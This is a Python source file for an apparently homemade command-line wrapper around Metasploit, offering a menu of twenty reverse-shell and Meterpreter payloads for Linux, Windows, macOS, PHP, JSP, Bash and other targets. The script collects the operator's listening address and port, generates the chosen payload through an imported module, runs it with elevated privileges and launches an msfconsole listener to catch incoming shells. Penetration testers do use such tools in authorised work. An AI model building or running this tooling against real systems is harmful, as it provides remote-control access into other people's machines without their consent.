#!/usr/bin/python3

import sys
import os
import subprocess
import magi
import magician_banner
import re
import random
import armoury


class bcolors:

    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'

colorArray = [bcolors.BLUE,bcolors.GREEN,bcolors.RED,bcolors.WHITE,bcolors.YELLOW]
color_set = random.choice(colorArray)

print(color_set)

def init():
    
    if len(sys.argv) == 1:

        magi.main() 
        print(color_set)

        banner.main()
        print(bcolors.ENDC)
    
    elif sys.argv[1] == "-q":

        magician_banner.main()
    print(bcolors.GREEN)
    print("[+]It's On!!!!!!")
    print(bcolors.ENDC)

def step1():

    print(bcolors.YELLOW)
    print("[+]Chose Your IP ")
    print(bcolors.ENDC)

    res = subprocess.getoutput("ifconfig")

    if "eth0:" in res:

        IP_addrs = subprocess.getoutput("ifconfig")
        IP_addrs = IP_addrs.split("\n")
        
        IP_array = []
        index_array = []
        counter = 0

        for i in  IP_addrs:
            

            
            reg = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",i)
            
            if reg:
                counter = counter + 1
                IP_array.append(reg.group())
                index_array.append(counter)
        
        for i in range(0,len(IP_array)):

            value  = index_array[int(i)]
            value2 = IP_array[int(i)]
            molded = f"{value} : {value2}"
            case = "   +"+"-"*len(molded)+"+"

            print(case)
            print(f"-->|{molded}|")
            print(case)
        
        print(bcolors.GREEN)
        print("[+]Chose LHOST")
        chosen = input("> ")
        print(bcolors.ENDC)

        lhost = IP_array[int(chosen)-1]
        
        del IP_addrs,IP_array,index_array,counter,chosen
        return lhost

    else:
        print(bcolors.RED)
        print("[!]AhOh... ifconfig command is not available...")
        print(bcolors.GREEN)
        lhost = input("[+]Enter Your IP: ")
        print(bcolors.ENDC)
        return lhost

def step2():
    print(bcolors.GREEN)
    print("[+]EnterYourPort ")
    print(bcolors.ENDC) 
    while True:
        selected_port = input("> ") 
        port_range = [p for p in range(1,65535)]
        
        try:
        
            if int(selected_port) in port_range:
                break

        except:
            
            print("[!]Invalid value")
                 
    del port_range
    return selected_port

def step3(lhost,selected_port):
    
    case = "-"*len(lhost)+"+"
    case2 = "-"*len(selected_port)+"+"
    

    host_info = f"""
    +-----+{case}-----+{case2}
    |LHOST|{lhost}|LPORT|{selected_port}|
    +-----+{case}-----+{case2}"""

    return host_info

def step4():
    menu = """
    [+]Select the number from below graph
    +-------+-----------------------------------------+--+
    |Linux  | x86/meterpreter/reverse_tcp             | 1|
    +-------+-----------------------------------------+--+
    |Linux  | x64/meterpreter/reverse_tcp             | 2|
    +-------+-----------------------------------------+--+
    |Linux  | x86/meterpreter_reverse_http            | 3|
    +-------+-----------------------------------------+--+
    |Linux  | x64/meterpreter_reverse_http            | 4|
    +-------+-----------------------------------------+--+
    |Windows| meterpreter/reverse_tcp                 | 5|
    +-------+-----------------------------------------+--+
    |Windows| shell_reverse_tcp                       | 6|
    +-------+-----------------------------------------+--+
    |Windows| meterpreter/reverse_http                | 7|
    +-------+-----------------------------------------+--+
    |Windows| meterpreter/reverse_https               | 8|
    +-------+-----------------------------------------+--+
    |Windows| reverse_powershell                      | 9|
    +-------+-----------------------------------------+--+
    |Windows| meterpreter/reverse_tcp #VBA            |10|
    +-------+-----------------------------------------+--+
    |MacOS  | x86/shell_reverse_tcp                   |11|
    +-------+-----------------------------------------+--+
    |MacOS  | x86/shell_reverse_tcp #ShellCode        |12|
    +-------+-----------------------------------------+--+
    |Python | cmd/unix/reverse_python                 |13|
    +-------+-----------------------------------------+--+
    |Bash   | cmd/unix/reverse_bash                   |14|
    +-------+-----------------------------------------+--+
    |Perl   | cmd/unix/reverse_perl                   |15|
    +-------+-----------------------------------------+--+
    |Asp    | windows/meterpreter/reverse_tcp         |16|
    +-------+-----------------------------------------+--+
    |JSP    | java/jsp_shell_reverse_tcp              |17|
    +-------+-----------------------------------------+--+
    |WAR    | java/jsp_shell_reverse_tcp              |18|
    +-------+-----------------------------------------+--+
    |PHP    | reverse_php                             |19|
    +-------+-----------------------------------------+--+
    |PHP    | meterpreter_reverse_tcp                 |20|
    +-------+-----------------------------------------+--+"""
    print(bcolors.YELLOW)
    print(menu)
    print(bcolors.GREEN)
    print("[+]Select The Number")
    print(bcolors.ENDC)
    ope_number = ""
    
    while True:
        cmd_number = input("> ")
        
        allow_array = ["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20"]
        
        if cmd_number in allow_array:
            break
        
        else:
            print(bcolors.RED)
            print("[!]Invalid number ")
            print("[+]Valid number range: 1~17")
            print(bcolors.ENDC)
    del allow_array
    
    cmd_number = int(cmd_number) - 1

    return cmd_number

def step5(lhost,selected_port,cmd_number,host_info):

     #cmd_number = int(cmd_number) - 1

     generated_payload = armoury.payload_gen(lhost,selected_port,cmd_number)
     
     if os.getuid() != 0:
       
         generated_payload = "sudo " + generated_payload
         
         print(bcolors.BLUE)
         print("[!]You are not roo user")
         print("[+]Adding the magic word to top of Command")
         print(bcolors.ENDC)

     case = "+"+"-"*len(generated_payload)+"+"
     case2 = "+"+"-"*len(lhost)+"+"
     case3 = "+"+"-"*len(selected_port)+"+"
     
     payload_info = f"""
     +-----{case2}-----{case3}
     |LHOST|{lhost}|LPORT|{selected_port}|
     {case}
     |{generated_payload}|
     {case}"""
   
     print(bcolors.RED)
     print(payload_info)
     print(bcolors.ENDC)


     print(f"{bcolors.YELLOW}[*]Now Working....{bcolors.ENDC}")

     os.system(generated_payload)

def step6(lhost,selected_port,cmd_number):

    set_payload = armoury.payload_setter(cmd_number)
    file_name = armoury.listener_config(lhost,selected_port,set_payload)
    
    if os.getuid() != 0:

        cmd = f"sudo msfconsole -r {file_name}"
    
    else:

        cmd = f"msfconsole -r {file_name}"

    os.system(cmd)
    #os.system(f"rm {file_name}")

if __name__ == "__main__":

    init()
    
    lhost  = step1()
    selected_port = step2()
    host_info = step3(lhost,selected_port)
    cmd_number = step4()
    step5(lhost,selected_port,cmd_number,host_info)    
    step6(lhost,selected_port,cmd_number)
